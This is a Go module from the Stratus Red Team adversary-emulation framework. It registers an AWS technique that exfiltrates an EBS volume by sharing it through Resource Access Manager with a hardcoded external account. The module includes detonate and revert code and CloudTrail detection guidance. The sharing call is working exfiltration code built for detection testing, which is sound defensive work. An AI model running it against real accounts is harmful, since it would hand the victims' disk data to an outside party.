package aws

import (
	"context"
	_ "embed"

	"github.com/aws/aws-sdk-go-v2/service/ram"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/log"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
)

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:                 "aws.exfiltration.ec2-share-ebs-volume",
		FriendlyName:       "Share an EBS Volume for Cross-Account Cloning",
		Platform:           stratus.AWS,
		IsIdempotent:       true,
		MitreAttackTactics: []mitreattack.Tactic{mitreattack.Exfiltration},
		FrameworkMappings: []stratus.FrameworkMappings{
			{
				Framework: stratus.ThreatTechniqueCatalogAWS,
				Techniques: []stratus.TechniqueMapping{
					{
						Name: "Modify Cloud Compute Infrastructure",
						ID:   "T1578",
						URL:  "https://aws-samples.github.io/threat-technique-catalog-for-aws/Techniques/T1578.html",
					},
				},
			},
		},
		Description: `
Exfiltrates an EBS volume by sharing it with an external AWS account through AWS Resource Access Manager (RAM).

Using the <a href="https://aws.amazon.com/blogs/aws/introducing-amazon-ebs-volume-clones-across-aws-accounts/">EBS Volume Clones across AWS accounts</a> feature, sharing a volume
with the <code>AWSRAMPermissionEBSVolumeCopyAccess</code> managed permission allows the recipient
account to create a cross-account clone of the volume and exfiltrate its data.

Warm-up:

- Create an EBS volume
- Create a RAM resource share with the <code>AWSRAMPermissionEBSVolumeCopyAccess</code> managed permission

Detonation:

- Call ram:AssociateResourceShare to share the EBS volume with an external, fictitious AWS account

Note: This technique shares an unencrypted EBS volume. Accounts with EBS encryption by default enabled may encrypt new volumes with the AWS managed key, which cannot be shared (see the <a href="https://docs.aws.amazon.com/ebs/latest/userguide/share-volume.html">AWS documentation</a>).
`,
		Detection: `
Through CloudTrail's <code>AssociateResourceShare</code> event (event source <code>ram.amazonaws.com</code>), when
<code>requestParameters</code> shows an EBS volume being shared with a new or unknown AWS account, such as:

<pre><code>"requestParameters": {
  "principals": ["999999999999"],
  "resourceArns": ["arn:aws:ec2:us-east-1:111111111111:volume/vol-0c741433d3ddb73c7"],
  "resourceShareArn": "arn:aws:ram:us-east-1:111111111111:resource-share/24048254-7629-41e0-ba73-f129af0cc68d"
}</code></pre>

In the same event <code>responseElements.resourceShareAssociations</code> carries an
<code>external</code> flag indicating whether RAM treats the recipient principal as outside the owner's AWS Organizations
boundary (see <a href="https://docs.aws.amazon.com/ram/latest/APIReference/API_ResourceShareAssociation.html">RAM API reference</a>).
<code>"external": true</code>. 

Note: RAM only recognizes a principal as in-organization when sharing with AWS Organizations is enabled (<code>ram:EnableSharingWithAwsOrganization</code>); when it is disabled,
an account in the same organization is reported as <code>external</code>.

<pre><code>"responseElements": {
  "resourceShareAssociations": [
    {
      "associationType": "RESOURCE",
      "associatedEntity": "arn:aws:ec2:us-east-1:111111111111:volume/vol-0c741433d3ddb73c7",
      "external": false
    },
    {
      "associationType": "PRINCIPAL",
      "associatedEntity": "999999999999",
      "external": true
    }
  ]
}</code></pre>

When the recipient account clones the shared volume, the <code>CopyVolumes</code> event is logged in
<b>both</b> the recipient account and the volume owner's account (see [AWS docs](https://docs.aws.amazon.com/ebs/latest/userguide/share-volume.html)).

In the owner's account, <code>userIdentity.accountId</code> contains the attacker's account ID, <code>recipientAccountId</code> contains the
victim's account ID where the volume was originally created, and <code>CopyVolumesRequest.SourceVolumeId</code> identifies the volume:

<pre><code>{
  "userIdentity": {
    "type": "AssumedRole",
    "accountId": "999999999999"
  },
  "eventSource": "ec2.amazonaws.com",
  "eventName": "CopyVolumes",
  "awsRegion": "us-east-1",
  "requestParameters": {
    "CopyVolumesRequest": {
      "SourceVolumeId": "vol-0c741433d3ddb73c7"
    }
  },
  "readOnly": false,
  "managementEvent": true,
  "recipientAccountId": "111111111111"
}</code></pre>

Note that detonating this attack technique with Stratus Red Team does *not* simulate an attacker cloning the volume from their account (only sharing it from your account).
`,
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

var ShareWithAccountId = "193672423079"

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	// associate the EBS volume with the RAM resource share
	ramClient := ram.NewFromConfig(providers.AWS().GetConnection())

	volumeArn := params["ebs_volume_arn"]
	resourceShareArn := params["ram_resource_share_arn"]

	log.Println("Sharing the volume " + volumeArn + " with an external AWS account...")
	_, err := ramClient.AssociateResourceShare(context.Background(), &ram.AssociateResourceShareInput{
		ResourceShareArn: &resourceShareArn,
		ResourceArns:     []string{volumeArn},
		Principals:       []string{ShareWithAccountId},
	})
	if err != nil {
		return err
	}

	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	ramClient := ram.NewFromConfig(providers.AWS().GetConnection())

	volumeArn := params["ebs_volume_arn"]
	resourceShareArn := params["ram_resource_share_arn"]

	log.Println("Reverting the sharing of the volume " + volumeArn + " with the external AWS account...")
	_, err := ramClient.DisassociateResourceShare(context.Background(), &ram.DisassociateResourceShareInput{
		ResourceShareArn: &resourceShareArn,
		ResourceArns:     []string{volumeArn},
		Principals:       []string{ShareWithAccountId},
	})
	if err != nil {
		return err
	}

	return nil
}
